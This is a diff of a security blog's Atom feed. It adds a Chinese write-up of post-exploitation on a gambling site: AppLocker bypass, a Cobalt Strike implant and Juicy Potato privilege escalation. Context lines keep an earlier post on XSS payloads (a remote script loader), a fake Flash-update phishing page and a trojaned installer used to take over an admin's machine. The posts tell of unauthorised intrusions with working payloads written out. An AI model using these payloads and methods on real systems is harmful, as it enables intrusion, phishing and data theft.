@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.se7ensec.cn/"/>
-  <updated>2020-01-04T20:40:12.152Z</updated>
+  <updated>2020-01-07T16:30:57.927Z</updated>
   <id>https://www.se7ensec.cn/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BC实战|后渗透之Bypass Applocker到提权</title>
+    <link href="https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/"/>
+    <id>https://www.se7ensec.cn/2020/01/08/BC实战后渗透之Bypass Applocker到提权/</id>
+    <published>2020-01-07T16:10:24.000Z</published>
+    <updated>2020-01-07T16:30:57.927Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>冷静分析，沉着应对。</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>提示：当个反面案例看就好，实际上拿下的方式远没有下文说的那么麻烦，只怪自己太心急…<br>本来是之前BC项目搞下来的一个推广站，当时只拿到了Shell</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/1.png" alt="1"></p><p>权限是一个普通用户，想提权进一步收集服务器上的信息时，发现运行各种东西都是权限拒绝，提示组策略阻止了这个程序，当时因为还有的别的事情，就没继续研究了（用户名比较敏感，后面全程打码）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/2.png" alt="2"></p><h1 id="0x02-Bypass-Applocker"><a href="#0x02-Bypass-Applocker" class="headerlink" title="0x02 Bypass Applocker"></a>0x02 Bypass Applocker</h1><p>最近突然想起来了，就继续搞一下，问了下群里的师傅</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/3.png" alt="3"></p><p>知道是什么东西以后就好说了，耐心找一找总会有收获的，附上Applocker介绍：</p><p><a href="https://baike.baidu.com/item/Applocker/2300852?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/Applocker/2300852?fr=aladdin</a></p><p>然后就找到3g师傅的一篇文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</a></p><p>具体怎么利用就自行看文章吧，看完文章后续的大概思路差不多就清晰了</p><h1 id="0x03-上线到提权"><a href="#0x03-上线到提权" class="headerlink" title="0x03 上线到提权"></a>0x03 上线到提权</h1><p>我想的是bypass applocker让目标服务器执行我的马子上线后在进行后续的提权，然而Shell下执行 net user、tasklist /SVC 等等都没得回显，不然可以通过进程对比判断下杀软（自己写的小轮子，目前可匹配进程已经增加到960+了：<a href="http://get-av.se7ensec.cn/）" target="_blank" rel="noopener">http://get-av.se7ensec.cn/）</a></p><p>既然不知道，那我就拼一拼人品，赌一下主机里没有杀软，通过上面3g师傅文章的第三种方式运行了我的马子，然后就成功上线了，忽略下面那个机器…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/4.png" alt="4"></p><p>CS上线以后再运行某些命令，比如下面这个，还有tasklist /SCV发现还是会拒绝访问</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/5.jpg" alt="5"></p><p>然后又尝试了下CS内置的查看系统进程命令 ”ps“，成功列出了系统进程，看了下确实是没有杀软的</p><p>/* 忘了截图 */</p><p>运行 “shell systeminfo” 发现系统和补丁信息居然可以看到了，然而系统根本没打几个补丁，运气有点好，看了下用户权限，符合Juicy Potato的要求，可以直接尝试下烂土豆提权：</p><p><a href="https://www.4hou.com/posts/vZoL" target="_blank" rel="noopener">https://www.4hou.com/posts/vZoL</a></p><p>经过测试发现上线以后（实际上本来就有执行权限，当时没有想到不对劲，事后总结文章时才意识到不太对，详见文末），C:\Users\Public\下有了执行权限，用Juicy Potato带个whoami参数执行下，成功返回了system</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/6.png" alt="6"></p><p>再直接用它执行下马子，等几秒就会过来一个System的会话了，翻了翻目录发现还是个站群</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/7.png" alt="7"></p><p>Administrator权限截个屏看下，怪不得那么多，原来人家都是批量建站的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/8.png" alt="8"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>碰巧这次运气好没有遇到杀软，不然肯定会是一路坎坷，也会更有挑战性</p><p>最失败的是这次自己没有提前全面了解Applocker的一些功能介绍： <a href="https://www.anquanke.com/post/id/159892" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159892</a> ，心急的搜到了bypass方法就开始用，其实这次遇到的只是文件路径的限制，C:\Users\Public\就可以执行程序，早一点发现的话也不会那么费劲，不过能完整了解到Applocker的机制，也算是一个收获吧</p><p>最后感谢下haya、Beli1v1师傅的指点和帮助。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;冷静分析，沉着应对。&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+    
+      <category term="APT相关" scheme="https://www.se7ensec.cn/categories/APT%E7%9B%B8%E5%85%B3/"/>
+    
+    
+      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
   
   <entry>
     <title>TeamViewer在BypassAV中的妙用</title>
@@ -46,7 +71,7 @@
     <link href="https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"/>
     <id>https://www.se7ensec.cn/2019/12/08/BC实战从Xss到主机上线/</id>
     <published>2019-12-08T15:10:24.000Z</published>
-    <updated>2019-12-08T16:40:28.646Z</updated>
+    <updated>2020-01-07T16:15:04.043Z</updated>
     
     <content type="html"><![CDATA[<blockquote><p>要保持学习的好习惯，这次平时学的就用上了。</p></blockquote><a id="more"></a><h1 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h1><p>前几天收到一封邮件，内容是这样的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/1.png" alt="1"></p><p>你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。</p><p>加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="官网截图"><a href="#官网截图" class="headerlink" title="官网截图"></a>官网截图</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/2.png" alt="2"></p><p>信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/3.png" alt="3"></p><p>想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。</p><h2 id="职业习惯："><a href="#职业习惯：" class="headerlink" title="职业习惯："></a>职业习惯：</h2><p>看见框就想叉，一发xss payload打过去：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=XSSURL&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/4.png" alt="4"></p><p>wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">相关介绍</a>，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。</p><p>再吃我一发：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/5.png" alt="5"></p><p>叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/6.png" alt="6"></p><h1 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h1><p>既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：<a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">传送门</a>。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>一个免费空间，一个免费域名（域名可以搞一个 <a href="http://www.flashxxx.tk" target="_blank" rel="noopener">www.flashxxx.tk</a> 这种的，可信度比较高），一个可以正常上线的马子。</p><p>然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/7.png" alt="7"></p><h2 id="关于马子"><a href="#关于马子" class="headerlink" title="关于马子"></a>关于马子</h2><p>可以做到运行正常安装文件的同时运行马子，骚姿势：<a href="https://www.baikesec.com/webstudy/still/77.html" target="_blank" rel="noopener">自解压捆绑文件的利用</a></p><p>为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。</p><h2 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h2><p>由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/8.png" alt="8"></p><h2 id="一切就绪"><a href="#一切就绪" class="headerlink" title="一切就绪"></a>一切就绪</h2><p>万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/9.png" alt="9"></p><p>页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页）</p><p>不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。</p><h2 id="成功上线："><a href="#成功上线：" class="headerlink" title="成功上线："></a>成功上线：</h2><p>这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/10.png" alt="10"></p><p>看一会对面在干哈：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/11.png" alt="11"></p><p>这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/12.png" alt="12"></p><p>打开了一个账面，这流水咱也看不懂：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/13.png" alt="13"></p><p>再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/14.png" alt="14"></p><p>F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/15.png" alt="15"></p><h1 id="点到为止："><a href="#点到为止：" class="headerlink" title="点到为止："></a>点到为止：</h1><p>不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/16.png" alt="16"></p>]]></content>
     
@@ -477,9 +502,9 @@
       <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="Sqlmap" scheme="https://www.se7ensec.cn/tags/Sqlmap/"/>
-    
       <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
+    
+      <category term="Sqlmap" scheme="https://www.se7ensec.cn/tags/Sqlmap/"/>
     
   </entry>
   
@@ -506,32 +531,6 @@
     
     
       <category term="00截断" scheme="https://www.se7ensec.cn/tags/00%E6%88%AA%E6%96%AD/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>我的梦想是年少有为</title>
-    <link href="https://www.se7ensec.cn/2019/02/18/%E6%88%91%E7%9A%84%E6%A2%A6%E6%83%B3%E6%98%AF%E5%B9%B4%E5%B0%91%E6%9C%89%E4%B8%BA/"/>
-    <id>https://www.se7ensec.cn/2019/02/18/我的梦想是年少有为/</id>
-    <published>2019-02-18T14:56:44.000Z</published>
-    <updated>2019-12-05T17:12:42.783Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://t1.picb.cc/uploads/2019/02/18/VvgEYJ.png" alt="1"></p><blockquote><p>其实这篇文章是自己两年前写的，旧博客备份下来以后就安静的躺在硬盘里了，重新编辑下留做纪念吧。</p></blockquote><a id="more"></a><h1 id="天真又懵懂"><a href="#天真又懵懂" class="headerlink" title="天真又懵懂"></a>天真又懵懂</h1><p>​       初中住校，封闭式管理，大约16岁开始接触电脑，当时一个月放一次假，就回家打打单机游戏，后来总是想打破游戏的规则限制，于是就修改游戏的配置文件，或者直接开挂，可以说是我对这方面感兴趣的开始。  </p><p>​        初升高的那个暑假，有一次搜索Q币充值截图生成器，发现了一个叫瑞雪的小朋友，12岁的他自学易语言，开发出这个软件，当时觉得很新奇。于就有了第一次接触编程软件的经历，但是因精力有限，没能坚持学下去，仅仅只会改改源码，拿着自己改的源码做的记事本软件，钓鱼软件，病毒生成软件……玩的不亦乐乎。</p><p><img src="https://t1.picb.cc/uploads/2019/02/18/VvgLFM.png" alt="2"></p><p>​       然后有一天在瑞雪的百度云里，无意间接触到了黑客这个词汇，虽然很熟悉，但是感觉很神秘，于是就开始百度，在看了一大堆屁用没有的介绍后，偶然发现了一个很吸引我的链接［玄风小组黑客网盘］，好奇的我点了进去发现有个登入密码，我试探性的输入了123，回车一摁，居然进去了！当时心里很激动(或许这就是最初次体验的破解密码的快感吧），黑色的网盘界面中，一个个从未见过的名词〔木马，抓鸡，渗透，远控，DDOS…〕引起了我强烈的好奇心。</p><p><img src="https://t1.picb.cc/uploads/2019/02/18/VvgsVt.png" alt="3"></p><h1 id="中二且热血"><a href="#中二且热血" class="headerlink" title="中二且热血"></a>中二且热血</h1><p>​       转眼高中开学，依旧封闭式教育，只有周日下午半天和每个月的两天假期，每周日下午会和同学一起去网吧，当在同学在游戏世界里大喊着德玛西亚，奋力厮杀时，我就在一旁瞎研究。还记得当时自己每次都会把网盘里的部分软件下载下来，但是因为什么都不会，上来就是瞎摁，不过摁着摁着也就慢慢明白了软件的功能和使用方法。后来去书店买练习册时看到了一本书《黑客攻防实战从入门到精通》（其实内容都是一些过时的东西了），当时想都没想就把它买了下来，然后就开始了“进步最快”的一个阶段。因为平时没有办法出学校，所以就每天中午睡觉的时间都来看这本书，不会的就做下笔记，记了好多cmd命令，还贴在墙上，不懂得就找机会去百度查，差不多用了多半年的时间，感觉能看懂了书里的大部分内容。而且当时百度到了一套玄风小组的初级渗透教程，放在云盘里，放假有空就会看一下，然后就自己一步一步跟着视频学，虽然听起来很枯燥，不过每当我体会到了一些新的东西，就会觉得很满足，很开心。</p><p><img src="https://t1.picb.cc/uploads/2019/02/18/VvgDjr.png" alt="4"></p><p>​        上面那个ID和QQ上大学之后我都没再用过了，空间被我加了锁，锁住了逝去的青春，也锁住了所谓的“情窦初开”，现在只是当个游戏号。以上这个时间段，搞过别人，也被别人搞过，学的三脚猫功夫很多很杂，比如（钓鱼，盗号，社工，刷钻……很多东西就不贴图了，貌似是大多数人的必经之路啊），不过在后来的学习就不是很简单了，有些东西没有人告诉你，你要自己去百度，去过滤筛选有用的信息，一次又一次遇到瓶颈，然后突破，再次遇到瓶颈，再突破。遇到问题难以解决的的感觉很不好，但是当你自己突然领悟到它的真谛时，你会觉得豁然开朗，就这样自己慢慢接触的东西越来越多，会的也越来越多。</p><h1 id="梦想和成长"><a href="#梦想和成长" class="headerlink" title="梦想和成长"></a>梦想和成长</h1><p>​       大学期间，个人感觉是进步最快的一个阶段，因为觉得不甘心当个脚本小子，就报了轮子（软件工程）专业，最直接的原因：懂了程序就懂了原理，懂了原理就懂得利用。期间小迪哥的教程（虽然不认识），可以算是我的启蒙老师，让我正式入了门。从杂乱无章的学习到相对系统的认知，这是个我认为最难跨越的阶段，不记得自己到底用了多久，不过一个深切的感觉，越学觉得越菜，越觉得自己不懂得太多。在大学里有幸结识了志同道合的学长学弟，组建了信安社团，参加了一些大大小小CTF比赛，也结识了一些网络上的朋友，互相学习共同进步，真的是见识的人越多，越清楚自己和大佬的差距 (&gt;_&lt;) ，进入了特别想进入的T00ls，圈子等国内知名论坛，见识到了更多的骚操作。</p><p><img src="https://t1.picb.cc/uploads/2019/02/18/Vvgz4F.png" alt="5"></p><p>总结一下暂时完成的Flag（毕业之前继续努力）：漏洞平台提交，SRC提交，造轮子，CTF比赛证书，CNVD证书，CVE编号，，，大学完了以后再继续写吧。</p><p><strong>路漫漫其修远兮，吾将上下而求索。</strong></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://t1.picb.cc/uploads/2019/02/18/VvgEYJ.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;其实这篇文章是自己两年前写的，旧博客备份下来以后就安静的躺在硬盘里了，重新编辑下留做纪念吧。&lt;/p&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
-    
-    
-      <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
     
   </entry>
   
